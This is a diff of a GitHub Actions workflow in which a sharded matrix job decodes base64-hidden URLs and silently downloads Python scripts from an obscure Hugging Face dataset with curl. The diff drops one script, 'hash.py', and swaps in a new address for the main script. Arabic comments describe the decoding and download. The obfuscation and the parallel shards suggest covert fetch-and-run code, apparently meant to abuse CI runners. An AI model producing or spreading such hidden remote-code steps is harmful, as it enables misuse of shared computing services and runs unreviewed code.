@@ -26,11 +26,9 @@ jobs:
         run: |
           echo ">>> [SYSTEM] Starting Shard-${{ matrix.shard_id }} setup..."
           
-          # فك التشفير عبر base64 والتنزيل عبر curl الأصلي تماماً
-          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2h2L3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
-          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
+          # فك تشفير الرابط الجديد وتنزيل الملف الأساسي مباشرة
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2g0L3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
           
-          curl -sL "$URL_HASH" > hash.py
           curl -sL "$URL_MAIN" > start.py
           
           echo ">>> [SYSTEM] Installing Python modules..."
